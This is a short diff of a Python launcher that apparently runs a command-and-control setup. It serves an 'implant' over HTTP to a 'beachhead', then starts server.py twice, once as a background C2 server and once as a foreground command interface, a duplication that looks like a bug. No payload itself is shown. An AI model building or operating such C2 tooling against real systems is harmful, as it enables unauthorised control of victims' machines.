@@ -46,26 +46,34 @@ except FileNotFoundError:
     http_server.terminate()
     sys.exit(1)
 
-# Run server after first_stage completes
-print("\nRunning server.py...")
+# Start C2 server as background process after first_stage completes
+print("\nStarting C2 server...")
 try:
-    server_process = subprocess.Popen([sys.executable, 'server.py'])
-    print(f"server.py started (PID: {server_process.pid})")
+    c2_server_process = subprocess.Popen([sys.executable, 'server.py'])
+    print(f"C2 server started (PID: {c2_server_process.pid})")
 except FileNotFoundError:
     print(f"Error: Could not find 'server.py'")
     http_server.terminate()
     sys.exit(1)
 
-print("\n--- HTTP server and server.py still running ---")
+time.sleep(2)
+
+# Run client server.py in foreground so user can type commands
+print("\n--- Starting C2 client interface ---")
 print(f"  • HTTP server (implant): port {HTTP_SERVER_PORT}")
-print(f"  • server.py (PID: {server_process.pid})")
-print("Press Ctrl+C to shut down.")
+print(f"  • C2 server (backend): PID {c2_server_process.pid}")
+print("\nYou can now type commands below:\n")
 
 try:
-    # Keep the HTTP server running so beachhead can download implant.py
-    http_server.wait()
+    subprocess.run([sys.executable, 'server.py'], check=True)
 except KeyboardInterrupt:
-    print("\nShutting down...")
-    http_server.terminate()
-    server_process.terminate()
-    print("Clean exit.")
+    pass
+except FileNotFoundError:
+    print(f"Error: Could not find 'server.py'")
+except subprocess.CalledProcessError as e:
+    print(f"Error running server.py: {e}")
+
+print("\nShutting down...")
+http_server.terminate()
+c2_server_process.terminate()
+print("Clean exit.")
